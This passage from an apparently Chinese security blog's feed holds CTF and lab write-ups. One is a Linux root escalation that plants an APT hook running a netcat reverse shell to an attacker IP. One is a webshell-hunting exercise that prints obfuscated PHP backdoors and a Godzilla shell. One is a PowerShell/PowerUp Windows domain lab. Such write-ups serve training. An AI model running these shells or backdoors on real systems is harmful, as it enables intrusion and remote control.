<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">105</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">103</span>    <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">10</span>     <span class="token operator">|</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:47:39 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">1</span>      <span class="token operator">|</span> /sbin/init 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:48:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">13390</span>  <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:48:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">13391</span>  <span class="token operator">|</span> /usr/sbin/CRON <span class="token parameter variable">-f</span> 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:48:01 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">13392</span>  <span class="token operator">|</span> /bin/sh <span class="token parameter variable">-c</span> /usr/bin/apt-get update 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:48:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">13393</span>  <span class="token operator">|</span> /usr/bin/apt-get update 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:48:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">13394</span>  <span class="token operator">|</span> /usr/bin/apt-get update 
<span class="token number">2024</span>/07/13 <span class="token number">13</span>:48:02 CMD: <span class="token assign-left variable"><span class="token environment constant">UID</span></span><span class="token operator">=</span><span class="token number">0</span>    <span class="token assign-left variable">PID</span><span class="token operator">=</span><span class="token number">13395</span>  <span class="token operator">|</span> /usr/bin/apt-get update </code></pre>
<p>传入linpeas.sh分析</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">╔══════════╣ Interesting writable files owned by me or writable by everyone <span class="token punctuation">(</span>not <span class="token keyword">in</span> Home<span class="token punctuation">)</span> <span class="token punctuation">(</span>max <span class="token number">500</span><span class="token punctuation">)</span>
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation<span class="token comment">#writable-files                                                                                                                                                                            </span>
/dev/mqueue                                                                                                                                                                                                                                                  
/dev/shm
/etc/apt/apt.conf.d
/home/wally
/run/lock
/run/user/1000
/run/user/1000/gnupg
/run/user/1000/systemd
/run/user/1000/systemd/inaccessible
/run/user/1000/systemd/inaccessible/dir
/run/user/1000/systemd/inaccessible/reg
/run/user/1000/systemd/units
/tmp
/tmp/.font-unix
/tmp/.ICE-unix
/tmp/index.html
/tmp/index.html.1
/tmp/.Test-unix
<span class="token comment">#)You_can_write_even_more_files_inside_last_directory</span>

/var/lib/php/sessions
/var/tmp</code></pre>
<p>发现<code>/etc/apt/apt.conf.d</code>目录可写，真好结合定时任务apt-get update，写个配置文件让定时任务执行的时候执行里面的配置文件</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">wally@send:~$ <span class="token builtin class-name">echo</span> <span class="token string">'apt::Update::Pre-Invoke &#123;"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 192.168.56.104 4567 >/tmp/f"&#125;;'</span> <span class="token operator">></span> /etc/apt/apt.conf.d/tao</code></pre>
<p>具体可参考<a href="https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/">https://www.hackingarticles.in/linux-for-pentester-apt-privilege-escalation/</a><br>然后靶机监听就能拿到rootshell了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token operator">></span> <span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">4567</span>      
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> <span class="token number">4567</span> <span class="token punctuation">..</span>.
connect to <span class="token punctuation">[</span><span class="token number">192.168</span>.56.104<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span><span class="token number">192.168</span>.56.195<span class="token punctuation">]</span> <span class="token number">44056</span>
/bin/sh: <span class="token number">0</span>: can't access <span class="token function">tty</span><span class="token punctuation">;</span> job control turned off
<span class="token comment"># id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span> <span class="token assign-left variable">grupos</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">(</span>root<span class="token punctuation">)</span></code></pre>
]]></content>
      <categories>
        <category>Vulnyx</category>
      </categories>
      <tags>
        <tag>rsync</tag>
        <tag>apt-get</tag>
      </tags>
  </entry>
  <entry>
    <title>webshell查杀</title>
    <url>/posts/9c3ca66c/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><pre class="language-none"><code class="language-none">靶机账号密码 root xjwebshell
1.黑客webshell里面的flag flag&#123;xxxxx-xxxx-xxxx-xxxx-xxxx&#125;
2.黑客使用的什么工具的shell github地址的md5 flag&#123;md5&#125;
3.黑客隐藏shell的完整路径的md5 flag&#123;md5&#125; 注 : &#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;xxx.xxx
4.黑客免杀马完整路径 md5 flag&#123;md5&#125;</code></pre>
<h2 id="1-黑客webshell里面的flag"><a href="#1-黑客webshell里面的flag" class="headerlink" title="1.黑客webshell里面的flag"></a>1.黑客webshell里面的flag</h2><p>把www打包下来用d盾扫一下<br><img src="https://ooo.0x0.ooo/2024/06/07/OJlmsK.png" alt="OJlmsK.png" loading="lazy"><br>有个后门<code>top.php</code></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token variable">$key</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"password"</span><span class="token punctuation">;</span>

<span class="token comment">//ERsDHgEUC1hI</span>
<span class="token variable">$fun</span> <span class="token operator">=</span> <span class="token function">base64_decode</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'func'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$fun</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$fun</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$fun</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$key</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">7</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"a"</span><span class="token punctuation">;</span>
<span class="token variable">$s</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"s"</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token operator">.</span><span class="token variable">$s</span><span class="token operator">.</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string double-quoted-string">"func2"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$c</span><span class="token punctuation">(</span><span class="token variable">$fun</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span></code></pre>
<p>里面没有flag，说明不是这个<br><strong>shell.php</strong></p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span> <span class="token function">phpinfo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>@<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span></code></pre>
<p>也不是这个<br>看一下<strong>gz.php</strong>，看到flag</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
@<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">set_time_limit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
@<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">function</span> <span class="token function-definition function">encode</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">,</span><span class="token variable">$K</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">&lt;</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$D</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$K</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token operator">+</span><span class="token number">1</span><span class="token operator">&amp;</span><span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
        <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token variable">$D</span><span class="token punctuation">[</span><span class="token variable">$i</span><span class="token punctuation">]</span><span class="token operator">^</span><span class="token variable">$c</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> <span class="token variable">$D</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token comment">//027ccd04-5065-48b6-a32d-77c704a5e26d</span>
<span class="token variable">$payloadName</span><span class="token operator">=</span><span class="token string single-quoted-string">'payload'</span><span class="token punctuation">;</span>
<span class="token variable">$key</span><span class="token operator">=</span><span class="token string single-quoted-string">'3c6e0b8a9c15224a'</span><span class="token punctuation">;</span>
<span class="token variable">$data</span><span class="token operator">=</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"php://input"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$data</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$data</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$payload</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
		<span class="token keyword">eval</span><span class="token punctuation">(</span><span class="token variable">$payload</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">echo</span> <span class="token function">encode</span><span class="token punctuation">(</span>@<span class="token function">run</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">strpos</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"getBasicsInfo"</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
            <span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token variable">$payloadName</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">encode</span><span class="token punctuation">(</span><span class="token variable">$data</span><span class="token punctuation">,</span><span class="token variable">$key</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></span></code></pre>
<p>flag1 <strong>flag{027ccd04-5065-48b6-a32d-77c704a5e26d}</strong></p>
<h2 id="2、黑客使用的什么工具的shell-github地址的md5"><a href="#2、黑客使用的什么工具的shell-github地址的md5" class="headerlink" title="2、黑客使用的什么工具的shell github地址的md5"></a>2、黑客使用的什么工具的shell github地址的md5</h2><p>看前三行一眼哥斯拉，github地址<a href="https://github.com/BeichenDream/Godzilla">https://github.com/BeichenDream/Godzilla</a><br><img src="https://ooo.0x0.ooo/2024/06/07/OJlJoa.png" alt="OJlJoa.png" loading="lazy"><br>flag2 <strong>flag{39392de3218c333f794befef07ac9257}</strong></p>
<h2 id="3-黑客隐藏shell的完整路径的md5-flag-md5"><a href="#3-黑客隐藏shell的完整路径的md5-flag-md5" class="headerlink" title="3.黑客隐藏shell的完整路径的md5 flag{md5}"></a>3.黑客隐藏shell的完整路径的md5 flag{md5}</h2><p>看d盾知道gz.php目录在<code>/var/www/html/include/gz.php</code>，不过试了一下，flag不对<br>根据d盾结果，还有一个马<code>/var/www/html/include/Db/.Mysqli.php</code><br>md5加密得<code>aebac0e58cd6c5fad1695ee4d1ac1919</code><br>提交正确,看了一下这个马与gz一样<br>flag3 <strong>flag{aebac0e58cd6c5fad1695ee4d1ac1919}</strong></p>
<h2 id="4-黑客免杀马完整路径"><a href="#4-黑客免杀马完整路径" class="headerlink" title="4.黑客免杀马完整路径"></a>4.黑客免杀马完整路径</h2><p>一般免杀马会经过一些加密混淆，把上面那个top.php试了一下发现正确<br><code>/var/www/html/wap/top.php</code> -&gt;<code>eeff2eabfd9b7a6d26fc1a53d3f7d1de</code><br>看了一下日志，用了base64混淆</p>
<pre class="language-bash" data-language="bash"><code class="language-bash"><span class="token number">192.168</span>.200.2 - - <span class="token punctuation">[</span>02/Aug/2023:08:56:10 +0000<span class="token punctuation">]</span> <span class="token string">"GET /wap/top.php?fuc=ERsDHgEUC1hI&amp;func2=ser HTTP/1.1"</span> <span class="token number">500</span> <span class="token number">185</span>                                                                                                                 <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"</span>
<span class="token number">192.168</span>.200.2 - - <span class="token punctuation">[</span>02/Aug/2023:08:56:24 +0000<span class="token punctuation">]</span> <span class="token string">"GET /wap/top.php?fuc=ERsDHgEUC1hI&amp;func2=sert HTTP/1.1"</span> <span class="token number">200</span> <span class="token number">203</span>                                                                                                                 <span class="token string">"-"</span> <span class="token string">"Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101 Firefox/115.0"</span></code></pre>
<p>flag4 <strong>flag{eeff2eabfd9b7a6d26fc1a53d3f7d1de}</strong></p>
]]></content>
      <categories>
        <category>玄机应急靶场</category>
      </categories>
      <tags>
        <tag>webshell</tag>
      </tags>
  </entry>
  <entry>
    <title>域控-Offensive</title>
    <url>/posts/ca796a/</url>
    <content><![CDATA[<pre class="language-none"><code class="language-none">客户机:192.168.159.10
SQL server:192.168.159.20
DC:Administrator:192.168.159.200</code></pre>
<blockquote>
<p>目的:通过客户机提供的工具以及powershell获取域控权限</p>
</blockquote>
<p>客户机的工具<br><img src="https://ooo.0x0.ooo/2024/07/22/ORP2sM.png" alt="ORP2sM.png" loading="lazy"></p>
<h2 id="本地权限升级"><a href="#本地权限升级" class="headerlink" title="本地权限升级"></a>本地权限升级</h2><pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token operator">></span>whoami.exe /all

<span class="token environment constant">USER</span> INFORMATION
----------------

User Name       SID
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
offensive<span class="token punctuation">\</span>alice S-1-5-21-1187620287-4058297830-2395299116-1103


GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes                                     
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN<span class="token punctuation">\</span>Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>INTERACTIVE                   Well-known group S-1-5-4      Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                              Well-known group S-1-2-1      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY<span class="token punctuation">\</span>This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
LOCAL                                      Well-known group S-1-2-0      Mandatory group, Enabled by default, Enabled group
Authentication authority asserted identity Well-known group S-1-18-1     Mandatory group, Enabled by default, Enabled group
Mandatory Label<span class="token punctuation">\</span>Medium Mandatory Level     Label            S-1-16-8192                                                 


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                          State
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span> <span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>
SeShutdownPrivilege           Shut down the system                 Disabled
SeChangeNotifyPrivilege       Bypass traverse checking             Enabled
SeUndockPrivilege             Remove computer from docking station Disabled
SeIncreaseWorkingSetPrivilege Increase a process working <span class="token builtin class-name">set</span>       Disabled
SeTimeZonePrivilege           Change the <span class="token function">time</span> zone                 Disabled


<span class="token environment constant">USER</span> CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support <span class="token keyword">for</span> Dynamic Access Control on this device has been disabled.</code></pre>
<p>查看一下Administrators用户组</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token operator">></span>net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
offensive<span class="token punctuation">\</span>Domain Admins
The <span class="token builtin class-name">command</span> completed successfully.</code></pre>
<p>先想办法升级到Administartor<br>修改一下powershell执行策略为bypass，方便运行脚本</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token operator">></span>powershell.exe <span class="token parameter variable">-ep</span> bypass
Windows PowerShell
Copyright <span class="token punctuation">(</span>C<span class="token punctuation">)</span> Microsoft Corporation. All rights reserved.</code></pre>
<p>没有winpeas，只能用powerup了<br>导入power up模块</p>
<pre class="language-powershell" data-language="powershell"><code class="language-powershell"><span class="token function">PS</span> C:\Users\Alice\Desktop\tools> <span class="token function">Import-Module</span> <span class="token punctuation">.</span><span class="token operator">/</span>PowerUp<span class="token punctuation">.</span>ps1</code></pre>
<p>扫描一下可能存在的漏洞</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">PS C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>Desktop<span class="token punctuation">\</span>tools<span class="token operator">></span> Invoke-Allchecks <span class="token parameter variable">-verbose</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Running Invoke-AllChecks
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">if</span> user is <span class="token keyword">in</span> a <span class="token builtin class-name">local</span> group with administrative privileges<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">for</span> unquoted <span class="token function">service</span> paths<span class="token punctuation">..</span>.
ServiceName   <span class="token builtin class-name">:</span> VulnService
Path          <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Program Files<span class="token punctuation">\</span>Vuln Service<span class="token punctuation">\</span>VulnService.exe
StartName     <span class="token builtin class-name">:</span> LocalSystem
AbuseFunction <span class="token builtin class-name">:</span> Write-ServiceBinary <span class="token parameter variable">-ServiceName</span> <span class="token string">'VulnService'</span> <span class="token parameter variable">-Path</span> <span class="token operator">&lt;</span>HijackPath<span class="token operator">></span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token function">service</span> executable and argument permissions<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token function">service</span> permissions<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking %<span class="token environment constant">PATH</span>% <span class="token keyword">for</span> potentially hijackable .dll locations<span class="token punctuation">..</span>.
HijackablePath <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Users<span class="token punctuation">\</span>Alice<span class="token punctuation">\</span>AppData<span class="token punctuation">\</span>Local<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>WindowsApps<span class="token punctuation">\</span>
AbuseFunction  <span class="token builtin class-name">:</span> Write-HijackDll <span class="token parameter variable">-OutputFile</span> <span class="token string">'C:\Users\Alice\AppData\Local\Microsoft\WindowsApps\\wlbsctrl.dll'</span>
                 <span class="token parameter variable">-Command</span> <span class="token string">'...'</span>
HijackablePath <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Python27<span class="token punctuation">\</span>
AbuseFunction  <span class="token builtin class-name">:</span> Write-HijackDll <span class="token parameter variable">-OutputFile</span> <span class="token string">'C:\Python27\\wlbsctrl.dll'</span> <span class="token parameter variable">-Command</span> <span class="token string">'...'</span>
HijackablePath <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Python27<span class="token punctuation">\</span>Tools<span class="token punctuation">\</span>Scripts<span class="token punctuation">\</span>
AbuseFunction  <span class="token builtin class-name">:</span> Write-HijackDll <span class="token parameter variable">-OutputFile</span> <span class="token string">'C:\Python27\Tools\Scripts\\wlbsctrl.dll'</span> <span class="token parameter variable">-Command</span> <span class="token string">'...'</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">for</span> AlwaysInstallElevated registry key<span class="token punctuation">..</span>.
VERBOSE: HKLM:SOFTWARE<span class="token punctuation">\</span>Policies<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Installer does not exist
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">for</span> Autologon credentials <span class="token keyword">in</span> registry<span class="token punctuation">..</span>.
VERBOSE: AutoAdminLogon key: <span class="token number">0</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">for</span> vulnerable registry autoruns and configs<span class="token punctuation">..</span>.
Key            <span class="token builtin class-name">:</span> HKLM:<span class="token punctuation">\</span>SOFTWARE<span class="token punctuation">\</span>Microsoft<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>CurrentVersion<span class="token punctuation">\</span>Run<span class="token punctuation">\</span>bginfo
Path           <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>BGinfo<span class="token punctuation">\</span>Bginfo.exe /accepteula /ic:<span class="token punctuation">\</span>bginfo<span class="token punctuation">\</span>bgconfig.bgi /timer:0
ModifiableFile <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>BGinfo<span class="token punctuation">\</span>Bginfo.exe
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">for</span> vulnerable schtask files/configs<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">for</span> unattended <span class="token function">install</span> files<span class="token punctuation">..</span>.
UnattendPath <span class="token builtin class-name">:</span> C:<span class="token punctuation">\</span>Windows<span class="token punctuation">\</span>Panther<span class="token punctuation">\</span>Unattend.xml
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">for</span> encrypted web.config strings<span class="token punctuation">..</span>.
VERBOSE: Appcmd.exe does not exist <span class="token keyword">in</span> the default location.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Checking <span class="token keyword">for</span> encrypted application pool and virtual directory passwords<span class="token punctuation">..</span>.
VERBOSE: Appcmd.exe does not exist <span class="token keyword">in</span> the default location.</code></pre>
